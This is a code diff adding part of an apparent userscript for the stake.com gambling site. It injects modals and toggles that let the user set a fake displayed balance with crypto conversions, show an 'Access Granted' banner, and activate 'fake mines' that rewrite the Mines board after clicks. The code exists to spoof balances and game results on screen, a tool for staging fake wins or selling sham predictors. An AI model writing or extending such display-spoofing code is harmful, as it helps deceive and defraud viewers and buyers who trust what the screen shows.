+            } else {
+                document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-content.svelte-1u979cd > input").value = desiredNumber.toFixed(2);
+                const element22 = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label > span > div.currency-conversion.svelte-e4myuj > div > div")
+
+                if (currency === "ltc") {
+                    const cryptoAmount = (desiredNumber / rate).toFixed(8);
+                    element22.innerText = cryptoAmount + " LTC";
+                } else if (currency === "eth") {
+                    const cryptoAmount = (desiredNumber / rateeth).toFixed(8);
+                    element22.innerText = cryptoAmount + " ETH";
+                } else if (currency === "btc") {
+                    const cryptoAmount = (desiredNumber / ratebtc).toFixed(8);
+                    element22.innerText = cryptoAmount + " BTC";
+                }
+            }
+        });
+
+        modal2.querySelector('#balanceAmount').addEventListener('input', (event) => {
+            getBalanceElement().innerText = "$" + formatNumberWithCommas(parseFloat(event.target.value).toFixed(2));
+        });
+
+        // Add event listener for the new toggle switch (Auto Activate Fake Mines)
+        const autoActivateSwitch = modal2.querySelector('#autoActivateSwitch');
+        autoActivateSwitch.addEventListener('click', () => {
+            if (buttonClicked) {
+                showModal2("Please enable this option before interacting with the fake mines buttons.")
+                return
+            }
+            if (ranbefore) {
+                showModal2("Please disable this option in any other tab before proceeding.");
+                return
+            }
+            const isOn = autoActivateSwitch.style.backgroundColor === 'rgb(67, 181, 129)'; // #43b581 in RGB
+            autoActivateSwitch.style.backgroundColor = isOn ? '#555' : '#43b581';
+            const circle = autoActivateSwitch.querySelector('div');
+            circle.style.left = isOn ? '5px' : '25px';
+            localStorage.setItem('autoActivateFakeMines', isOn ? '0' : '1'); // Store 0 for false and 1 for true
+        });
+
+        // Add event listener for "Auto Load Previous Balance" switch
+        const autoLoadBalanceSwitch = modal2.querySelector('#autoLoadBalanceSwitch');
+        autoLoadBalanceSwitch.addEventListener('click', () => {
+            const isOn = autoLoadBalanceSwitch.style.backgroundColor === 'rgb(67, 181, 129)'; // #43b581 in RGB
+            autoLoadBalanceSwitch.style.backgroundColor = isOn ? '#555' : '#43b581';
+            const circle = autoLoadBalanceSwitch.querySelector('div');
+            circle.style.left = isOn ? '5px' : '25px';
+            localStorage.setItem('autoLoadPreviousBalance', isOn ? '0' : '1'); // Store 0 for false and 1 for true
+        });
+
+        // Add event listener for the toggle switch
+        const toggleSwitch = modal2.querySelector('#toggleSwitch');
+        toggleSwitch.addEventListener('click', () => {
+            const isOn = toggleSwitch.style.backgroundColor === 'rgb(67, 181, 129)'; // #43b581 in RGB
+            toggleSwitch.style.backgroundColor = isOn ? '#555' : '#43b581';
+            const circle = toggleSwitch.querySelector('div');
+            circle.style.left = isOn ? '5px' : '25px';
+            localStorage.setItem('showAccessGranted', isOn ? '0' : '1'); // Store 0 for false and 1 for true
+        });
+
+        return modal2;
+    }
+
+
+    function showCustommodal(message) {
+        if (!modal2) {
+            modal2 = createCustommodal2(message);
+        }
+        if (showaccess) {
+            toggleModalVisibility()
+        }
+    }
+
+    function toggleModalVisibility() {
+        isModalVisible = !isModalVisible;
+        modal2.style.display = isModalVisible ? 'block' : 'none';
+    }
+
+    function createModal(message) {
+        const modal = document.createElement('div');
+        modal.style.position = 'fixed';
+        modal.style.top = '50%';
+        modal.style.left = '50%';
+        modal.style.transform = 'translate(-50%, -50%)';
+        modal.style.backgroundColor = '#36393f'; // Discord dark theme background color
+        modal.style.padding = '20px';
+        modal.style.color = 'white';
+        modal.style.borderRadius = '10px';
+        modal.style.textAlign = 'center';
+        modal.innerHTML = `
+            <h2 style="margin-bottom: 20px;">Mines System</h2>
+            <p style="margin-top: 10px; color: #43b581;">${message}</p>
+        `;
+
+        document.body.appendChild(modal);
+
+        return modal;
+    }
+
+
+
+    function activatefakemines() {
+        buttonContainer = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-content.svelte-1ku0r3 > div");
+        // Select all buttons within the container
+        buttons = buttonContainer.querySelectorAll('button');
+
+        buttons.forEach((button, index) => {
+            // Add click event listener
+            button.addEventListener('click', () => {
+                if (!shouldContinue) return
+                const dataRevealed = button.getAttribute('data-revealed');
+
+                retryUntilTrue(() => {
+                    return button.getAttribute('data-revealed') === 'true';
+                }, 50)
+                    .then(() => {
+                    turnintobombs()
+                    const savedMineNode = localStorage.getItem('copiedMineElement');
+                    if (button.classList[1] === 'gem') {
+                        document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > button").addEventListener("click", function() {
+                            restoreAttempt()
+                        });
+                        return Promise.reject('Stopping further execution'); // Stop the code execution here
+                    } else if (button.classList[1] === 'mine') {
+                        if (savedMineNode) {
+                            const parsedNode = new DOMParser().parseFromString(savedMineNode, 'text/html');
+                            button.replaceWith(parsedNode.body.firstChild);
+                        }
+                    }
+
+                    return retryUntilTrue2((clickedButtonIndex) => {
+                        return buttonContainer.querySelectorAll('div.cover.gem.svelte-1avx2pj').length > 1 ||
+                            (buttonContainer.querySelector('div.cover.gem.svelte-1avx2pj') &&
+                             parseInt(buttonContainer.querySelector('div.cover.gem.svelte-1avx2pj').dataset.index) !== clickedButtonIndex);
+                    }, 50, index); // Pass the index of the clicked button
+                })
+                    .then(() => {
+                    findGemElement((parentNode) => {
+                        const gemElement = parentNode;
+                        if (gemElement) {
+                        } else {
+                        }
+                    });
+                })
+                    .catch((error) => {
+
+                });
+            });
+        });
+    }
+
+    function showModal(message) {
+        if (isModalVisible) return;
+        const modal = document.createElement('div');
+        modal.style.position = 'fixed';
+        modal.style.top = '50%';
+        modal.style.left = '50%';
+        modal.style.transform = 'translate(-50%, -50%)';
+        modal.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
+        modal.style.color = 'white';
+        modal.style.padding = '20px';
+        modal.style.borderRadius = '5px';
+        modal.style.zIndex = '9999';
+        modal.innerHTML = `<p>${message}</p>`;
+        document.body.appendChild(modal);
+        isModalVisible = true;
+        setTimeout(() => {
+            document.body.removeChild(modal);
+            isModalVisible = false;
+        }, 2000);
+    }
+
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+    function main() {
+        if (!registrationChecked) {
+            if (window.location.href === "https://stake.com" || window.location.href === "https://stake.com/") {
+                checkRegistrationStatus();
+            } else {
+                if (localStorage.getItem('autoLoadPreviousBalance') === '1') {
+                    applybal()
+                }
+            }
+        }
+    }
+    main()
+
+})();
